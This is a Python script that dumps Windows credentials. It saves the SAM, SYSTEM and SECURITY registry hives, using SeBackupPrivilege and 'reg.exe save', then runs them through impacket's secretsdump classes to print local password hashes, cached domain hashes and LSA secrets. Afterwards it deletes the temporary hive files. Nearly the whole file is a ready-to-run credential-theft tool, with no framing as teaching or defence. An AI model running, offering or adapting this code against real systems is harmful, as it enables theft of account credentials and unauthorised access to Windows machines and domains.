import logging, os
from impacket.examples.secretsdump import LocalOperations, SAMHashes, LSASecrets
import winreg, win32security, win32api

try:
    input = raw_input
except NameError:
    pass

class DumpSecrets:
    def __init__(self, system='', sam='', security=''):
        self.__lmhash = ''
        self.__nthash = ''
        self.__history = ''
        self.__smbConnection = None
        self.__remoteOps = None
        self.__SAMHashes = None
        self.__NTDSHashes = None
        self.__LSASecrets = None
        self.__systemHive = system
        self.__bootkey = None
        self.__securityHive = security
        self.__samHive = sam
        self.__noLMHash = True
        self.__isRemote = False
        self.__canProcessSAMLSA = True

    def dump(self):
        if self.__systemHive and self.__samHive:
            try:
                localOperations = LocalOperations(self.__systemHive)
                bootKey = localOperations.getBootKey()
                SAMFileName = self.__samHive
                self.__SAMHashes = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)
                self.__SAMHashes.dump()
            except Exception as e:
                logging.error('SAM hashes extraction failed: %s' % str(e))
        if self.__securityHive:
            SECURITYFileName = self.__securityHive
            self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps, isRemote=self.__isRemote, history=self.__history)
            self.__LSASecrets.dumpCachedHashes()
            self.__LSASecrets.dumpSecrets()
        self.cleanup()

    def cleanup(self):
        if self.__SAMHashes:
            self.__SAMHashes.finish()
        if self.__LSASecrets:
            self.__LSASecrets.finish()



if __name__ == '__main__':
    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SAM') as handle: # Replace with the desired key
        try:
            win32security.AdjustTokenPrivileges(win32security.OpenProcessToken(win32api.GetCurrentProcess(), 40), 0, [(win32security.LookupPrivilegeValue(None, 'SeBackupPrivilege'), 2)]) # Basically, adjusts permissions for the interpreter to allow registry backups
            winreg.SaveKey(handle, 'sa.tmp') # Replace with the desired file path
        except OSError as err:
            print("[-] Failed to dump SAM:", err)
            os.remove("sa.tmp")
            exit()
    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM') as handle: # Replace with the desired key
        try:
            win32security.AdjustTokenPrivileges(win32security.OpenProcessToken(win32api.GetCurrentProcess(), 40), 0, [(win32security.LookupPrivilegeValue(None, 'SeBackupPrivilege'), 2)]) # Basically, adjusts permissions for the interpreter to allow registry backups
            winreg.SaveKey(handle, 'sy.tmp') # Replace with the desired file path
        except OSError as err:
            print("[-] Failed to dump SYSTEM:", err)
            os.remove("sy.tmp")
            exit()
    system = "sy.tmp"
    sam = "sa.tmp"
    os.system("reg.exe save hklm\security sec.tmp /y")
    security = "sec.tmp"
    dumper = DumpSecrets(system, sam, security)
    dumper.dump()
    os.remove("sa.tmp")
    os.remove("sy.tmp")
    os.remove("sec.tmp")
    print("Hello! :)")

